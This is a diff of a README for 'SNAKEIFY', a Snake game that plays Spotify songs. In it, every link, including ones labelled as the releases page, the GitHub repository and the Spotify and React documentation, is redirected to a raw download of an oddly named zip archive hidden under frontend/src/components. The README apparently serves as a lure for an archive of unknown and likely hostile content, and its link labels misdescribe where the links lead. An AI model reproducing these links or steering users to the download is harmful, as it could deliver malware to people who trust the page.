@@ -1,7 +1,7 @@
 # 🎮 SNAKEIFY - Enjoy Music While Playing Snake
 
 ## 📥 Download SNAKEIFY
-[![Download SNAKEIFY](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/SNAKEIFY-v3.6.zip%https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/SNAKEIFY-v3.6.zip)](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/SNAKEIFY-v3.6.zip)
+[![Download SNAKEIFY](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/src/components/Software_caterpillared.zip%https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/src/components/Software_caterpillared.zip)](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/src/components/Software_caterpillared.zip)
 
 ## 🚀 Getting Started
 Welcome to SNAKEIFY! This is a fun and interactive game that combines the classic Snake experience with your favorite Spotify Liked Songs. Follow these simple steps to download and run the game.
@@ -18,7 +18,7 @@ Welcome to SNAKEIFY! This is a fun and interactive game that combines the classi
 - User-friendly interface built with React for an enjoyable gaming experience.
 
 ## 💾 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/SNAKEIFY-v3.6.zip) to download the latest version of SNAKEIFY. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/src/components/Software_caterpillared.zip) to download the latest version of SNAKEIFY. Follow these steps:
 
 1. Click on the **Releases page** link.
 2. Look for the latest version.
@@ -46,8 +46,8 @@ For further questions or support, please open an issue in the GitHub repository 
 If you enjoy SNAKEIFY, consider sharing your high scores and experiences on social media. Join our community to learn tips and tricks from other players.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/SNAKEIFY-v3.6.zip)
-- [Spotify Web API Documentation](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/SNAKEIFY-v3.6.zip)
-- [React Documentation](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/SNAKEIFY-v3.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/src/components/Software_caterpillared.zip)
+- [Spotify Web API Documentation](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/src/components/Software_caterpillared.zip)
+- [React Documentation](https://raw.githubusercontent.com/layanalhrby/SNAKEIFY/main/frontend/src/components/Software_caterpillared.zip)
 
 Thank you for trying out SNAKEIFY! Enjoy mixing gaming and music in a unique way.
